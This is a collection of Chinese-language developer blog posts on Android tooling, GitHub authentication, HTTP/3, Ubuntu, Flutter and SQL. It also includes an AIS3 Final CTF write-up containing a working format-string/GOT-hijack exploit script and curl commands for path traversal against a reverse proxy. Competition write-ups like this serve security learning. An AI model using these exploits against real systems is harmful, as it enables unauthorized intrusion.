[{"content":"在購買 Macbook Air M1 後，被它的效能和續航驚艷到了，但同時，還有許多應用沒有很好的支援 M1 晶片。所以身為 Android Developer 的我 ，當然要來嘗試在 M1 晶片下運行 Android Studio 看看啦～\n 本文章撰寫於 2021 年 05 月 05 日，內容皆以當時情況為依據。\n Android Studio Android Studio 終於在 Arctic Fox Canary 15 下，初步支援 Ｍac M1 晶片啦！終於不用再使用卡卡的 Android Studio 了！目前雖然只是初步的支援，還有不少問題尚待修正，但我相信距離完整支援已經不遠了。詳細可以參考 Android Studio Arctic Fox Canary 的 Release Notes。\n Android Studio Arctic Fox 已更新到 Beta 5。 [2021.07.04]\n 模擬器（Emulator） AVD Manager 中，目前終於有支援 M1 晶片的映像檔啦！但可惜的是，目前只有少數幾個版本支援，其中筆者目前只有成功執行 API Level R 的映像檔，其他都無法執行起來。\n自己試用下來感覺還滿流暢的，也沒遇到什麼問題，早期版本會遇到的 Chrome 無法使用的問題也已修正。\n另外，看到下面的建議訊息不用理會，R API Level M1 Android Emulator 運行起來效能不會輸 Intel® HAXM，可以安心選用。\nGradle Gradle 在 7.0 開始也支援 M1 晶片了，想體驗 M1 的超強效能，就馬上更新起來吧！詳細可以參考官方的 Release Notes。\nJVM Android Studio Canary 裡的 JDK 也支援 M1 晶片囉！\n如果不是使用 Canary 版本，但想要體驗更快的速度，也可以自行安裝 Azul Zulu Arm64 Open JDK，它有提供 M1 ARM 版本的 JVM 唷！\n安裝完後，前往「Build, Execution, Deployment」-\u0026gt;「Build Tools」-\u0026gt;「Gradle」，可以自行調整想要使用的 JVM 版本喔～\n結論 Android 相關的開發工具目前都逐步開始支援 M1 晶片了。整體使用下來，Gradle build 的時間縮短許多，但 IDE 使用起來還是有些問題和不流暢，但已經能免強堪用！想要將它當主力開發機建議再等等，但相信距離完全支援已經不遠了！\n","permalink":"https://blackmaple.me/android-studio-in-m1-mac/","summary":"\u003cp\u003e在購買 Macbook Air M1 後，被它的效能和續航驚艷到了，但同時，還有許多應用沒有很好的支援 M1 晶片。所以身為 Android Developer 的我 ，當然要來嘗試在 M1 晶片下運行 Android Studio 看看啦～\u003c/p\u003e","title":"在 M1 Macbook 下開發 Android"},{"content":"今天我突然收到來自 GitHub 的警告信，標題為 [GitHub] Deprecation Notice，其內容大致上是在建議使用者升級 Git 客戶端的版本，後來查看其中附的連結後發現 GitHub 公佈了一項新政策：\n GitHub 將在 2021 年 8 月 13 日禁止所有基於帳密的驗證機制，以提升帳密的安全性。\n 有什麼影響？ 目前會影響到的只有需要輸入帳號密碼的驗證方式（不包括 OAuth），所以若之前是使用 SSH 驗證 或是 二階段驗證，則不在影響範圍內。\nGitHub 為什麼要這麼做呢？ 這更改是為了提升帳密的安全性，同時改用 token 驗證取代也有以幾項好處：\n 允許針對 Token 來調整不同的存取的權限 可以任意撤銷發出去的 token，且不影響原本的帳密設定 可以根據不同使用者及需求產生獨一無二的 token，同時也避免帳號密碼留存在電腦中  未來該怎麼做呢？ 若你是在影響範圍內，只要升級 Git 的版本就沒問題囉！\n參考 Token authentication requirements for Git operations - The GitHub Blog\n 若喜歡我的文章，可以點擊下方拍手給予我鼓勵唷～\n ","permalink":"https://blackmaple.me/github-deprecate-password-authentication/","summary":"今天我突然收到來自 GitHub 的警告信，標題為 [GitHub] Deprecation Notice，其內容大致上是在建議使用者升級 Git 客戶端的版本，後來查看其中附的連結後發現 GitHub 公佈了一項新政策：\n GitHub 將在 2021 年 8 月 13 日禁止所有基於帳密的驗證機制，以提升帳密的安全性。\n 有什麼影響？ 目前會影響到的只有需要輸入帳號密碼的驗證方式（不包括 OAuth），所以若之前是使用 SSH 驗證 或是 二階段驗證，則不在影響範圍內。\nGitHub 為什麼要這麼做呢？ 這更改是為了提升帳密的安全性，同時改用 token 驗證取代也有以幾項好處：\n 允許針對 Token 來調整不同的存取的權限 可以任意撤銷發出去的 token，且不影響原本的帳密設定 可以根據不同使用者及需求產生獨一無二的 token，同時也避免帳號密碼留存在電腦中  未來該怎麼做呢？ 若你是在影響範圍內，只要升級 Git 的版本就沒問題囉！\n參考 Token authentication requirements for Git operations - The GitHub Blog\n 若喜歡我的文章，可以點擊下方拍手給予我鼓勵唷～\n ","title":"GitHub 將取消基於密碼的驗證機制"},{"content":"前言 今天在寫公司專案的時候遇到部分 Android 7 的手機，PopupWindow 不會理會設置好的 gravity，會直接跑到頂部。\n原因 在 Android Code Search 追了一下原始碼，發現 Android 7 在執行 PopupWindow.update() 的時候，會將 gravity 重設，因此造成 gravity 被重置為 Gravity.START | Gravity.TOP。\n有興趣的話可以自己看一下 Google 後來修復的 commit\n解法 剛好出問題的那段程式看起來沒有必要使用 update()，因此拿掉後問題就修復了。當然如果你一定需要使用 update() 的話，可以參考這篇 SlackOverflow，裡面有各種大神給的解法，這邊就不贅述囉！\n","permalink":"https://blackmaple.me/android-popupwindow-gravity-issue/","summary":"前言 今天在寫公司專案的時候遇到部分 Android 7 的手機，PopupWindow 不會理會設置好的 gravity，會直接跑到頂部。\n原因 在 Android Code Search 追了一下原始碼，發現 Android 7 在執行 PopupWindow.update() 的時候，會將 gravity 重設，因此造成 gravity 被重置為 Gravity.START | Gravity.TOP。\n有興趣的話可以自己看一下 Google 後來修復的 commit\n解法 剛好出問題的那段程式看起來沒有必要使用 update()，因此拿掉後問題就修復了。當然如果你一定需要使用 update() 的話，可以參考這篇 SlackOverflow，裡面有各種大神給的解法，這邊就不贅述囉！","title":"[Android] PopupWindow 設置 gravity 無效的問題"},{"content":"不久前 Android 11 正式發布，可以看到有許多很酷炫的新功能，其中對身為 Android 開發者的我來說最興奮的應該就是「無線偵錯」了，這樣出門就可以更方便的開發了，因此趁著這段空閑就來試試看！\n一、過去 在 Android 11 以前，要安裝 App 到手機上只有兩種方式：\n USB 傳輸線 ADB Over Wireless： 這方法使用的是 ADB 的 tcpip 和 connect 指令來連接兩個裝置，但在第一次連接的時候，還是得插上傳輸線，且當中斷後要重新連上時，也還是得再次插上傳輸線。  這些方法都有一些局限性，因此之前一直在期待說未來會不會有更方便的方式呢？\n二、現在 - Android 11 無線偵錯（Wireless Debugging）是 Android 11 的新功能，可以透過 WiFi 來連結兩裝置，這也是仰賴了新的 ADB 指令 - pair 才得以達成。它相較過往的方式有幾項優點：\n 不需要 USB 傳輸線 不需要額外安裝任何東西 只要開啟「無線偵錯」就可以自動重新連接  三、無線偵錯 Wireless Debugging 前提條件  手機版本 ≥ Android 11 SDK platform-tools 版本 ≥ 30.0.0 手機與電腦連上同一個 WiFi  步驟 - Android 11 手機   點擊 設定 → 開發人員選項 → 允許「無線偵錯」\n  點擊 無線偵錯 → 使用配對碼配對裝置\n  紀錄「Wi-Fi 配對碼」及「IP 位址和通訊埠」，後面會用到\n  步驟 - 電腦   安裝 ADB\n 已安裝 Android Studio → 可以在 Android SDK 底下的 platform-tools 資料夾中找到 adb 未安裝 Android Studio → 可以在 Google 上找到很多方法，這邊就不贅述了    在 terminal 中執行 adb pair ipaddr:port\n ipaddr：填入上面步驟 3 取得的 IP port：填入上面步驟 3 取得的 port    輸入「Wi-Fi 配對碼」。成功後會顯示訊息配對成功的訊息。\n1 2  Enter pairing code: 482924 Successfully paired to 192.168.0.106:37117 [guid=adb-08141JEC216786-neR228]     若 Android Studio 上還是找不到該裝置，則需要手動執行 adb connect ipaddr:port 來連接。IP 和 port 請使用下方這組，千萬不要用到上面那組喔！！\n ","permalink":"https://blackmaple.me/android-11-wireless-debug/","summary":"\u003cp\u003e不久前 Android 11 正式發布，可以看到有許多很酷炫的新功能，其中對身為 Android 開發者的我來說最興奮的應該就是「無線偵錯」了，這樣出門就可以更方便的開發了，因此趁著這段空閑就來試試看！\u003c/p\u003e","title":"Android 11 新增無線偵錯 (Wireless Debugging)"},{"content":"創建 server 後，我們通常都會先在其中創建我們自己的 user 方便操作，同時也會需要有 root 權限才能操作更多指令。\n 每個 Linux 發行版對於創建 sudo 使用者的操作都是大同小異，但可能會有一些差別，因此這邊紀錄了 Ubuntu 20.04 的 sudo 使用者創建方式。\n   以 root 身份登錄到你的伺服器。\n 將下面 server_ip_address 替換為你伺服器的 ip\n 1  ssh root@server_ip_address      使用 adduser 指令將新用戶添加到你的系統\n 將下面 username 替換為你要創建的用戶\n 1  adduser your_username     設置 user 的密碼和資訊\n 第 3 點的資料可以隨便填或留空\n   使用 usermod 指令將用戶添加到 wheel 中。\n1  usermod -aG sudo your_username   默認情況下，在 Ubuntu 上，sudo 群組裡的成員具有 sudo 權限。\n  在 user 上測試 sudo 訪問權限\n  使用該 su 命令切換到新的 user 。\n1  su - your_username     測試是否擁有 root 權限\n1  sudo ls -la /     第一次使用 sudo 時，系統會提示你輸入 user 的密碼。輸入密碼以繼續，如果您前面操作正確，則會以 root 權限來執行。\n1 2  Output: [sudo] password for username:      ","permalink":"https://blackmaple.me/%E5%A6%82%E4%BD%95%E5%9C%A8-ubuntu-20-04-%E5%89%B5%E5%BB%BA-sudo-user/","summary":"\u003cp\u003e創建 server 後，我們通常都會先在其中創建我們自己的 user 方便操作，同時也會需要有 root 權限才能操作更多指令。\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e每個 Linux 發行版對於創建 sudo 使用者的操作都是大同小異，但可能會有一些差別，因此這邊紀錄了 Ubuntu 20.04 的 sudo 使用者創建方式。\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003e以 root 身份登錄到你的伺服器。\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e將下面 server_ip_address 替換為你伺服器的 ip\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cdiv style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4\"\u003e\n\u003ctable style=\"border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;\"\u003e\u003ctr\u003e\u003ctd style=\"vertical-align:top;padding:0;margin:0;border:0;\"\u003e\n\u003cpre style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4\"\u003e\u003ccode\u003e\u003cspan style=\"margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e1\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/td\u003e\n\u003ctd style=\"vertical-align:top;padding:0;margin:0;border:0;;width:100%\"\u003e\n\u003cpre style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4\"\u003e\u003ccode class=\"language-fallback\" data-lang=\"fallback\"\u003essh root@server_ip_address\n\u003c/code\u003e\u003c/pre\u003e\u003c/td\u003e\u003c/tr\u003e\u003c/table\u003e\n\u003c/div\u003e\n\u003c/div\u003e\u003c/li\u003e\n\u003c/ol\u003e","title":"如何在 Ubuntu 20.04 創建 Sudo user？"},{"content":"商業智慧的含義 什麼是商業智慧？ 資料倉儲學院（TDWI）將商業智慧比喻成 資料煉油廠：\n 煉油廠流程：原料 → 原油 → 各式商品 商業智慧流程：原料 → 原始資料 → 各式資訊產品  商業智慧即是一個資訊處理的程序，經過一連串資料萃取、轉換，並載入資料倉儲後，允許使用者透過各種資料查詢和分析方法。目的在於匯聚過往經驗，已產生管理目前並規劃未來企業運作的經營智慧。\n商業智慧可以大略分成以下流程：\n 從 原始資料 到 資料倉儲的資訊  從企業交易和內營運系統中萃取出資料 再經過處理及轉換 將定義清楚且一致的資料彙總 載入資料倉儲   從 資訊 到 知識  利用各種報表和分析工具，分析資料倉儲中的資訊 可以找出資料中的趨勢、型態、例外狀況，協助使用者將資訊轉成知識   從 知識 到 決策  從分析中所發現的趨勢和型態中可以建立業務規則，也可作為建立決策模型的依據   從 決策 到 行動  根據決策產生執行計畫，將決策方案轉成實際行動   回饋迴圈 — 一但計劃開始實施，整個循環便會重複  根據顧客的後續反應，可以萃取出新的資料 將新萃取的資料輸出到新的商業智慧流程中 如此循環即可不斷的修正決策，以達到最佳效果    商業智慧有以下基本概念需要注意：\n 整個流程是環環相扣的，若有疏忽則會影響後續流程 商業智慧的成效有賴於資料和資訊的品質，若垃圾進則會垃圾出 須整合業務和資訊技術的專業 目的在於支援決策  結構化決策：可透過商業智慧工具達到近乎自動化 半結構化決策：可提供決策參考   關鍵績效指標（KPI）必須定義清楚、客觀衡量，並定期檢討修正   BI 在本質上是一套程序、方法和資訊技術的整合運用\n 關鍵績效指標（KPI） 績效評量的三種類型：\n 關鍵結果指標（KRI）  衡量這家公司某方面的表現 常被誤認為 KPI 格式工具：數位儀表板 指標屬性：落後指標 檢視週期：每個月、每季或每年   績效指標（PI）  指出該做的是什麼   關鍵績效指標（KPI）  告訴公司該做什麼可以改善公司績效 格式工具：平衡計分卡 指標屬性：領先指標 \\ 目前或未來導向 檢視週期：全時監控或每天或每週    平衡計分卡（BSC） 平衡計分卡是一種策略管理方法，透過績效管理從四個構面將組織願景和策略化為具體的實施方案。\n四大構面：\n 財務 顧客 內部流程 學習與成長  平衡計分卡主張由以上四個構面來定義其策略目標，有助於兼顧影響公司長期發展的所有構面。\n","permalink":"https://blackmaple.me/%E5%95%86%E6%A5%AD%E6%99%BA%E6%85%A7%E7%AD%86%E8%A8%98%E4%B8%80-%E5%A4%A7%E6%95%B8%E6%93%9A%E6%99%82%E4%BB%A3%E7%9A%84%E5%95%86%E6%A5%AD%E6%99%BA%E6%85%A7%E7%B0%A1%E4%BB%8B/","summary":"\u003ch2 id=\"商業智慧的含義\"\u003e商業智慧的含義\u003c/h2\u003e\n\u003ch3 id=\"什麼是商業智慧\"\u003e什麼是商業智慧？\u003c/h3\u003e\n\u003cp\u003e資料倉儲學院（TDWI）將商業智慧比喻成 \u003cstrong\u003e資料煉油廠\u003c/strong\u003e：\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e煉油廠流程：原料 → 原油 → 各式商品\u003c/li\u003e\n\u003cli\u003e商業智慧流程：原料 → 原始資料 → 各式資訊產品\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e商業智慧即是一個資訊處理的程序，經過一連串資料萃取、轉換，並載入資料倉儲後，允許使用者透過各種資料查詢和分析方法。目的在於匯聚過往經驗，已產生管理目前並規劃未來企業運作的經營智慧。\u003c/p\u003e","title":"商業智慧筆記（一）- 大數據時代的商業智慧簡介"},{"content":"一、前言 聽到 HTTP/3 竟然要放棄 TCP 改用 UDP，相信不少人應該都感到很驚訝。在過往教課書及老師都告訴我們「UDP 不可靠，所以 HTTP 使用比較可靠的 TCP」，從來沒有想過這知識有一天竟然會被推翻，因此在震驚之餘，也來研究了一下 HTTP/3 內容及 HTTP 的過去、現在和未來。\n2018 年 11 月，官方 (IETF) 批准，認可 HTTP-over-QUIC 實驗性協議重新命名為 HTTP/3，並成為 HTTP 的第三個正式版本。\n2019 年， Cloudflare、Chrome、Firefox 陸陸續續的支援了 HTTP/3，並共同合作來推行這項協定。\n目前逐漸成為主流的 HTTP/2 ，其相比 HTTP/1 大幅提升了性能，使網站只需要升級到新版協議即可享受性能所帶來的提升。當然其中也有許多問題，其中兼容性的問題也使得 HTTP/2 難以快速普及。\n既然 HTTP/2 有許多不完美之處，因此新的 HTTP/3 被推出來，為了解決 HTTP/2 所存在的問題。\n接下來我會從基礎的 HTTP/1 講起，省略掉一些複雜的細節，簡單的帶大家了解 HTTP 的過去、現在和未來。\n二、發展歷史 HTTP 是 HyperText Transfer Protocol（超文本傳輸協定）的縮寫，是目前網際網路上應用最廣泛的網路協定。\n從 1996 年發布的 HTTP/1.0 到後來的 HTTP/2.0，它們都建立在 TCP 上，屬於電腦網路中的應用層，因此 HTTP 的瓶頸及優化方式都是基於 TCP 本身的特性。\n1. HTTP/1 HTTP/1.0 是第一個在通訊中指定版本號的 HTTP 版本，至今仍被廣泛採用，特別是在代理伺服器中。\n不過隨著 HTTP/1.0 的快速成長，許多缺點也隨之暴露出來。在 HTTP/1.0 中，客戶端和伺服器之間交換的每個請求/回應都會建立一個新的 TCP 連接，這也意味著所有 TCP/TLS 握手均要在每個請求之前完成，因此所有請求都會產生延遲。\n更糟糕的是，TCP 不是在建立連接後儘快發送所有未完成的資料，而需要“慢啟動”的預熱時間，這使 “TCP 擁塞控制”能夠隨時確定可以傳輸的資料量，防止網路路徑發生擁塞，並避免將無法處理的封包都堆到網路中。但是，由於新連接必須經過緩慢的啟動過程，因此它們無法立即使用所有可用的網路帶寬。\n因此 HTTP/1.1 根據 HTTP/1.0 的一些問題做了優化。最重要改變是持久連接被預設採用以及HTTP 管線化。持久連接使客戶端能重複使用同一個 TCP 連接，從而分攤建立多個請求所花費的時間成本；HTTP 管線化使 HTTP 能同時傳送多個請求，以降負載，提高傳輸速度。但其因為必須按照客戶端傳送的請求順序來回覆請求，因此同時還是只能處理一個請求/回應。\n除此之外 HTTP/1.1 也做了一些改進如下：\n 快取處理 頻寬最佳化及網路連接的使用 錯誤通知的管理 訊息在網路中的傳送 網際網路位址的維護 安全性及完整性  2. SPDY \u0026amp; HTTP/2 隨著網際網路發展日趨蓬勃，網站所需資源及規模不斷增長，HTTP/1 已無法滿足需求，因此 SPDY \u0026amp; HTTP/2 也隨之而來。\nSPDY 協定 2009 年，Google 為了解決 HTTP/1.1 效率不高的問題，設計了 SPDY 協定。SPDY 協定通過 header 壓縮、多路復用和優先級等來縮短載入時間。\nHTTP/2 2015 年，繼承 SPDY 的 HTTP/2 協定發布。HTTP/2 基於 SPDY，專注於性能，最大的一個目標是在用戶和網站間只用一個連接。\nHTTP/2 特性：\n 二進位傳輸：HTTP/2 採用了二進位而非明文來打包。 多路復用：很好地解決了瀏覽器限制同一個域名下的請求數量的問題，同時也更容易實現全速傳輸。 Header 壓縮：引入 HPACK 演算法，用於對 HTTP 頭部做壓縮。 伺服器推播：使伺服器可以預先將客戶端需要的內容傳送過去，而不需要等待頁面的解析。  3. HTTP/3 雖然 HTTP/2 解決了許多舊版本的問題，但因其基於 TCP 上，所以還是存在一個巨大的問題。\n在丟包的情況下，TCP 會整個重新傳送，間接造成後面的數據被阻塞，導致 HTTP/2 的表現不如 HTTP/1。這是 TCP 本身的問題，但因 TCP 是由作業系統實現的協定，想要修改是一件不可能完成的任務。\n基於這個原因，Google 設計了一個基於 UDP 的 QUIC 協定，並使用在 HTTP 上。最初其被命名為 HTTP-over-QUIC，後來經過官方批准後，改名為 HTTP/3。\n與 TCP 相比，UDP 提供了更大的靈活性，並且使 QUIC 實現完全存在於用戶空間，使其脫離作業系統的依賴，讓使用者只要更新到支援 QUIC 的瀏覽器版本，使用者即可享受到 HTTP/3 所帶來的提升。\n以往我們認為 UDP 雖然實現簡單且傳輸效率高，但它安全低且可能有調包的風險。不過所幸基於 UDP 所設計的 QUIC 解決了以上問題，讓我們享受 HTTP/2 所有優點的同時，也解決了隊頭阻塞的問題。\nQUIC 還結合了典型的 3 向交握和 TLS 1.3 的握手。結合這些步驟意味著加密和身份驗證能夠默認提供，並且還可以更快地建立連接。\n三、總結  HTTP/1：有連接無法復用、隊頭阻塞、協定開銷大和安全因素等多種缺陷。 HTTP/2：通過多路復用、二進制流與 Header 壓縮等技術，極大地提高了性能，但是還是存在一些問題。 HTTP/3：拋棄 TCP，以全新的視角重新設計 HTTP。其底層支撐是 QUIC 協議，該協議基於 UDP，有 UDP 特有的優勢，同時它又取了 TCP 中的精華，實現了即快又可靠的協議。  從 HTTP/1 到 HTTP/3 經過不斷的更新及優化，底層協定也從 TCP 改成 UDP，許多以往我們所認定的觀念也跟著被推翻，這其中有許多事情值得我們細細思考。\n四、參考資料  超文本傳輸協定 - 維基百科 隊頭阻塞 - 維基百科 TCP 壅塞控制 - 維基百科 SPDY - 維基百科 HTTP/3 - 維基百科 HTTP/3 的过去、现在和未来 ","permalink":"https://blackmaple.me/http-3-%E6%94%B9%E6%88%90%E5%9F%BA%E6%96%BC-udphttp-%E7%9A%84%E9%81%8E%E5%8E%BB%E7%8F%BE%E5%9C%A8%E5%92%8C%E6%9C%AA%E4%BE%86/","summary":"\u003ch2 id=\"一前言\"\u003e一、前言\u003c/h2\u003e\n\u003cp\u003e聽到 HTTP/3 竟然要放棄 TCP 改用 UDP，相信不少人應該都感到很驚訝。在過往教課書及老師都告訴我們「UDP 不可靠，所以 HTTP 使用比較可靠的 TCP」，從來沒有想過這知識有一天竟然會被推翻，因此在震驚之餘，也來研究了一下 HTTP/3 內容及 HTTP 的過去、現在和未來。\u003c/p\u003e","title":"HTTP/3 改用 UDP？ HTTP 的過去、現在和未來"},{"content":"Const  需要在創建時就給定值，且會在編譯時期決定好，因此如果是執行時期才知道的值是不能用 const 的。 const 裡的值也得要是 const，不能是在執行階段才知道或是可改變的值，因此下面的範例會失敗： 1 2  const arr = [1, 2, 3] arr[1] = 11 // 執行失敗     Final  給定值之後就不能再更改，但可以在建構子之中再給。  ","permalink":"https://blackmaple.me/flutter-const-vs-final/","summary":"Const  需要在創建時就給定值，且會在編譯時期決定好，因此如果是執行時期才知道的值是不能用 const 的。 const 裡的值也得要是 const，不能是在執行階段才知道或是可改變的值，因此下面的範例會失敗： 1 2  const arr = [1, 2, 3] arr[1] = 11 // 執行失敗     Final  給定值之後就不能再更改，但可以在建構子之中再給。  ","title":"Flutter: const vs final"},{"content":"我們這隊都是第一次參加 AIS3 Final CTF，結果拿到第 18 名的成績，滿開心的ＸＤ 這邊整理了一些解題過程和思路，有興趣可以看一下～ 如果有任何其他思路也歡迎在下面提出！\n misc Painting bot/100  This is an AI painting bot. Could you get the flag from the bot? (Please remember to back up important files in your system.) (Any loss caused by this program will not be covered by us.)\nhttp://ctf.ais3.org/files/misc1_artist.exe\n 這是我原本看到題目後做的事 查看檔案有沒有藏東西 發現有HTML，因此用 dd 拆出來，打開後發現沒屁用  沒頭緒\n  其實也不需要頭緒，只要和小畫家一起打開就好，然後在他開始控制滑鼠前切到小畫家就好QwQ\n  RPG/200  Here is a secret RPGMaker XP game. Win the game and you will get the flag! If you don\u0026rsquo;t have rtp, please visit the site at https://sites.google.com/site/taiwanrpgplayer/rtp and download RPG Maker XP RTP.\nhttp://ctf.ais3.org/files/misc2_rpg.exe\n 由於作者在開發時使用了有中文名稱的 bgm 檔案，如果跳出`沒有發現檔案 Audio/BGM/巨人`的錯誤訊息，~~恭喜你，作者排擠使用非 Big5 碼的族群~~，想辦法轉區吧 (´・ω・`)  首先，到網路上找到神奇的 rgss decrypter，把所有東西全部解出來\n接著到官網下載 RPG Maker XP 開發工具，它可以順便裝好 RTP 開一個新 project 把所有東西丟進去 (或是在 rgss decrypter 點 Generate Game.rxproj)， 在 end 的場景左上角會發現一個被框起來的格子 (event) 打開之後就會發現這一行：\n如果把它塞進初始化的 event 裡，遊戲一開始就會跳出 flag 給你看了 OωO\n Hat/300  Every hacker has his/her own hat! Try to customize one for yourself!\nhttp://srv03.ctf.ais3.org:9001/\n 聽說找到 .git 的資料夾可以還原兩個檔案\n pwn Baby format/100  Nothing in the world cannot be solved by a single printf. If there was, try to work with two printf\u0026rsquo;s! hint: printf has buffer, and you will only see the output after the buffer is full. hint2: maybe try GOT Hijack and return to main\nhttp://ctf.ais3.org/files/pwn1_fmt.7z\nservice is on srv01.ctf.ais3.org:5521\n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83  import sys from pwn import * host = \u0026#39;srv01.ctf.ais3.org\u0026#39; port = 5521 if len(sys.argv) \u0026gt; 1: r = remote(host, port) else: r = process(\u0026#39;./fmt\u0026#39;) main = 0x400646 start_main_offset = 0x21ab0 + 0xe7 one_gadget = 0x10a38c puts = 0x601018 def get_fmt_payload(value, target): global num num = num % 256 if value == num: return \u0026#39;\u0026#39; elif value \u0026gt; num: payload = \u0026#39;%\u0026#39; + str(value-num) + \u0026#39;c\u0026#39; + target num = value return payload else: n = 256-num + value num = value return \u0026#39;%\u0026#39; + str(n) + \u0026#39;c\u0026#39; + target num = 73 payload = \u0026#39;startLeak:%39$p:%41$p:%43$p:%69$p\u0026#39; payload += get_fmt_payload(0x46, \u0026#39;%32$hhn\u0026#39;) payload += get_fmt_payload(0x06, \u0026#39;%33$hhn\u0026#39;) payload += get_fmt_payload(0x40, \u0026#39;%34$hhn\u0026#39;) payload += \u0026#39;%10000c\u0026#39; payload = payload.ljust(0xd0, \u0026#39;\\x00\u0026#39;) payload += p64(puts) payload += p64(puts+0x1) payload += p64(puts+0x2) r.sendline(payload) r.recvuntil(\u0026#39;startLeak:\u0026#39;) canary = int(r.recvuntil(\u0026#39;:\u0026#39;)[:-1], 16) libc = int(r.recvuntil(\u0026#39;:\u0026#39;)[:-1], 16) - start_main_offset ret_addr = int(r.recvuntil(\u0026#39;:\u0026#39;)[:-1], 16) - 0xe0 print(\u0026#39;libc:\u0026#39;, hex(libc)) print(\u0026#39;canary:\u0026#39;, hex(canary)) print(\u0026#39;ret_addr:\u0026#39;, hex(ret_addr)) gadget = libc+one_gadget print(\u0026#39;gadget:\u0026#39;, hex(gadget)) num = 0 payload = get_fmt_payload(gadget\u0026amp;0xff, \u0026#39;%32$hhn\u0026#39;) gadget = gadget \u0026gt;\u0026gt; 8 payload += get_fmt_payload(gadget\u0026amp;0xff, \u0026#39;%33$hhn\u0026#39;) gadget = gadget \u0026gt;\u0026gt; 8 payload += get_fmt_payload(gadget\u0026amp;0xff, \u0026#39;%34$hhn\u0026#39;) gadget = gadget \u0026gt;\u0026gt; 8 payload += get_fmt_payload(gadget\u0026amp;0xff, \u0026#39;%35$hhn\u0026#39;) gadget = gadget \u0026gt;\u0026gt; 8 payload += get_fmt_payload(gadget\u0026amp;0xff, \u0026#39;%36$hhn\u0026#39;) gadget = gadget \u0026gt;\u0026gt; 8 payload += get_fmt_payload(gadget\u0026amp;0xff, \u0026#39;%37$hhn\u0026#39;) gadget = gadget \u0026gt;\u0026gt; 8 payload = payload.ljust(0xd0, \u0026#39;\\x00\u0026#39;) payload += p64(puts) payload += p64(puts+0x1) payload += p64(puts+0x2) payload += p64(puts+0x3) payload += p64(puts+0x4) payload += p64(puts+0x5) payload += p64(puts+0x6) r.sendline(payload) r.interactive()    web Secret message/100  One secret person embeds a secret message in the website. Could you find the message?\nhttp://srv02.ctf.ais3.org:8887/\n 1 2 3 4 5 6 7 8 9 10 11 12  potocol=GET i=0 while [ $i -lt 100 ]; do curl http://srv02.ctf.ais3.org:8887/ -i -X $potocol \u0026gt;\u0026gt; flags.txt potocol=$(curl http://srv02.ctf.ais3.org:8887/ -i -X $potocol | grep Next | cut -f 2 -d \u0026#39; \u0026#39; | tr -d \u0026#34;\\r\u0026#34;) echo \u0026gt;\u0026gt; flags.txt i=$[$i+1] done   然後我用手拼起來\u0026hellip;\nFlag 1  AIS3{HtTpMe5h0dI5FunaNdGo0DXDdDdDDDx!}    Reverse proxy/200  Bob setup a simple reverse proxy, and configured some passwords. Unfortunately, he lost the password. Could you please help him to find it out? http://ctf.ais3.org/files/web2_main.py\nhttp://srv02.ctf.ais3.org:8787/\n 這題一開始有提供 python 的程式，可以把它執行起來，會比較好研究\n在程式中可以看到，編輯中\n1 2  curl http://srv02.ctf.ais3.org:8787/%2e%2e/%2e%2e/%2e%2e/password/wa -X POST \u0026gt; /dev/null curl http://srv02.ctf.ais3.org:8787/wa -X ADMIN -d \u0026#39;QAQ\u0026#39;   Flag 1  AIS3{f1aSk_pr0Xy_5Erver_15_N1Ce!!}    Invitation letter/300  Customize your own invitation letter!\nhttp://srv03.ctf.ais3.org:9002/\n ==還沒解完==\nrobots.txt http://srv03.ctf.ais3.org:9002/robots.txt\n看起來是程式碼 http://srv03.ctf.ais3.org:9002/files/app.py.old_20180531\n無法存取的 flag.txt http://srv03.ctf.ais3.org:9002/files/flag.txt\n","permalink":"https://blackmaple.me/ais3-final-ctf-helloworld/","summary":"\u003cp\u003e我們這隊都是第一次參加 AIS3 Final CTF，結果拿到第 18 名的成績，滿開心的ＸＤ\n這邊整理了一些解題過程和思路，有興趣可以看一下～\n如果有任何其他思路也歡迎在下面提出！\u003c/p\u003e","title":"AIS3 Final CTF - hellOwOrld"},{"content":"基本語法 創建資料表 CREATE TABLE\n1 2 3 4 5  CREATE TABLE table_name ( column_1 data_type, column_2 data_type, column_3 data_type );   1 2 3 4 5  CREATE TABLE celebs ( id INTEGER, name TEXT, age INTEGER );   1 2 3 4 5 6  CREATE TABLE celebs ( id INTEGER PRIMARY KEY, name TEXT UNIQUE, date_of_birth TEXT NOT NULL, date_of_death TEXT DEFAULT \u0026#39;Not Applicable\u0026#39;, );     PRIMARY KEY：可用於資料的唯一識別，不能重複，一個資料只能有一個欄位是 PRIMARY KEY。\n  UNIQUE：與 PRIMARY KEY 很像，不過它可以設置在一個資料的多個欄位\n  NOT NULL：強制該欄位一定要給定值\n  DEFAULT：如果欄位沒有值，會自動定預設值\n  刪除資料表 DROP DATABASE\n1  DROP DATABASE table_name;   新增資料 INSERT INTO\n1 2 3 4  INSERT INTO table_name (id, name, age) VALUES (1, \u0026#39;Justin Bieber\u0026#39;, 21); SELECT * FROM table_name;   資料表查詢 SELECT\n1  SELECT column_name FROM table_name;   1  SELECT * FROM table_name;   更新資料 UPDATE\n1 2 3  UPDATE celebs SET age = 22 WHERE id = 1;   改變資料表欄位 ALTER TABLE\n 新增欄位 1 2  ALTER TABLE celebs ADD COLUMN twitter_handle TEXT;    刪除欄位 1 2  ALTER TABLE celebs DROP COLUMN twitter_handle;    修改欄位  SQL Server / MS Access 1 2  ALTER TABLE celebs ALTER COLUMN twitter_handle 